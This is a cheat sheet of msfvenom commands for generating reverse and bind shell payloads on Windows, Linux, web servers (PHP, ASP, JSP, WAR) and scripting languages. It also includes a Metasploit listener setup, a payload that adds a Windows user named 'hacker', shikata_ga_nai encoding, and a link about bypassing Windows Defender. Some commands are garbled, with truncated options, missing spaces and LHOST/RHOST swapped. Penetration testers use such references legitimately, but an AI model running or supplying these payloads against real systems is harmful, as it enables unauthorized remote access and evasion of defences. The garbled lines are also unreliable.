## Creating a payload

```
msfvenom -p [payload] LHOST=[listeninghost] LPORT=[listeningport]
msfvenom -l payloads
msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options
```


## Creating a payload with encoding

```bash
msfvenom -p [payload] -e [encoder] -f [formattype] -i [iteration] <var=value> -o outputfile
```

## Creating a payload using a template

```bash
msfvenom -p [payload] <var=value> -x [template] -f [formattype] -o outputfile
```

## Listening for MSfvenom Payloads:

```
msf5>use exploit/multi/handler  
msf5>set payload windows/meterpreter/reverse_tcp  
msf5>set lhost <IP>  
msf5>set lport <PORT>  
msf5> set ExitOnSession false  
msf5>exploit -j  
```

## Windows Payloads

```bash
msfvenom -p windows/powershell/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe	

 msfvenom -p windows/powershell_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) msfvenom -p windows/powershell/bind_tcp RHOST= IP 
 msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe	
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe-o shell.exe
```

## Linux Payloads

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=IP LPORT=PORT -f elf -oshell.elf	
msfvenom -p linux/x86/shell/bind_tcp RHOST=IP LPORT=PORT -f elf -o shell.elf	
msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf -o shell.elf	
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf -o shell.elf
```

Add a user in windows with msfvenom: 

```bash
msfvenom -p windows/adduser USER=hacker PASS=password -f exe -o useradd.exe
```

## Web Payloads

PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw -o shell.php

  cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

ASP
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -o shell.asp
```

JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw -o shell.jsp
```

WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war-o shell.war
```

## Scripting Payloads

Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw -o shell.py
```

Bash

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw -o shell.sh
```

Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw -o shell.pl
```


Creating an Msfvenom Payload with an encoder while **removing bad charecters:**

```bash
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x0A\x0D"
```

## Resources:

https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/